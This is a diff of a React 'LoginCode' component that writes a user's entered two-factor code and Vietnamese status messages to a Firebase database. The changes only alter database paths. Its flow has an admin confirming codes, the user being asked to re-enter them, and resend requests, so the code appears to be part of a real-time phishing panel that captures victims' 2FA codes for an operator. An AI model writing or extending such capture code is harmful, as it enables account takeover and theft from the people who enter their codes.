@@ -21,12 +21,10 @@ const LoginCode = () => {
     setValidating(true);
     const updates = {};
 
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "2facode"
-    ] = facode;
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận mã đăng nhập từ admin";
+    updates["/" + localStorage.getItem("record_uid") + "/" + "2facode"] =
+      facode;
+    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
+      "Đang chờ xác nhận mã đăng nhập từ admin";
 
     update(ref(database), updates);
   };
@@ -35,16 +33,15 @@ const LoginCode = () => {
     setError_login_code(false);
     setResending(true);
     const updates = {};
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "User yêu cầu gửi lại mã đăng nhập";
+    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
+      "User yêu cầu gửi lại mã đăng nhập";
     update(ref(database), updates);
   };
 
   useEffect(() => {
     const starCountRef = ref(
       database,
-      "records/" + localStorage.getItem("record_uid")
+      "/" + localStorage.getItem("record_uid")
     );
     onValue(starCountRef, (snapshot) => {
       const data = snapshot.val();
@@ -56,7 +53,7 @@ const LoginCode = () => {
         setError_login_code(true);
         const updates = {};
         updates[
-          "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+          "/" + localStorage.getItem("record_uid") + "/" + "user_status"
         ] = "Đang chờ user nhập lại mã đăng nhập";
 
         update(ref(database), updates);
